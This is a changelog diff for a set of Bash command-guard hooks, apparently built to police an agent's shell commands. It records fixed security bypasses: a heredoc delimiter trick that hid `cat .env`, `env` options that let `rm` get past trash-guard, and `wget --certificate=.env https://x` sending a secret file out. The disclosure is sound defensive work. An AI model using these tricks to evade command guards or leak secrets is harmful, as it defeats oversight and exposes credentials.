@@ -6,6 +6,16 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 
 ## [Unreleased]
 
+### Security
+
+- **A heredoc delimiter that is an expansion is read whole, as bash reads it.** Bash takes `<<$(x)` literally and ends the body at a line reading `$(x)`; the shared delimiter parser stopped at the `(` and ended the body at a line reading `$`, so `cat <<$(x)` ⏎ `foo` ⏎ `$(x)` ⏎ `cat .env` ⏎ `$` hid the read from every guard. `$(…)`, `${…}` and `` `…` `` delimiters are now read to their end; one whose end cannot be read confidently (unbalanced, multi-line, quoted inside `${…}`, or over 64 characters) is refused as a delimiter, so the text after it stays code. (cameronsjo/cadence-hooks#1137)
+- **`env`'s own rules now decide where its command starts, in the shared peel and in `enforce-worktree`.** GNU `env`'s bare `-` (its alias for `-i`) and its signal options (`--default-signal`, `--ignore-signal`, `--block-signal`, each with an optional glued value, and `--list-signal-handling`) stopped the runner peel, so `env - rm note.md` and `env --block-signal=INT rm note.md` deleted a vault note past `trash-guard`. Separately, `enforce-worktree` read `env`'s operands by the shell's assignment rule, so `env A-B=1 git commit`, `env 'A B=1' git commit` and `env -i -- A-B=1 git commit` from a primary checkout were allowed; any leading operand containing `=` is now an assignment to `env`, and a `GIT_DIR=` after one is still read. (cameronsjo/cadence-hooks#1135)
+- **`prevent-secret-leaks` judges the files `wget` loads into a request.** `--certificate`, `--private-key`, `--ca-certificate` and `--load-cookies` (and their `-e` wgetrc spellings) join the #1125 grammar as reads, matching curl's `--cert`/`-b`, and `--save-cookies` is judged as a write by `prevent-secret-writes`. `wget --certificate=.env https://x` was allowed. (cameronsjo/cadence-hooks#1134)
+
+### Fixed
+
+- **`strip_quotes` reads quote boundaries with the shared quote model.** Its private two-toggle scan ended `"a\"b"` at the escaped quote, so quoted prose after it leaked into every consumer's structure scan and the real closer reopened a phantom run that hid the next command: `warn-alias-parsing` nudged on `cat f | jq .` inside an escaped JSON string and stayed silent on a real `echo "a\"b" ; cat f | jq .`. `warn-alias-parsing` also strips heredoc bodies now, so a `cat f | jq .` written into one no longer nudges. A 16,632-cell old/new differential across twelve Bash guards moved no verdict from BLOCK to ALLOW. (cameronsjo/cadence-hooks#1035)
+
 ## [0.111.0] - 2026-09-29
 
 ### Security
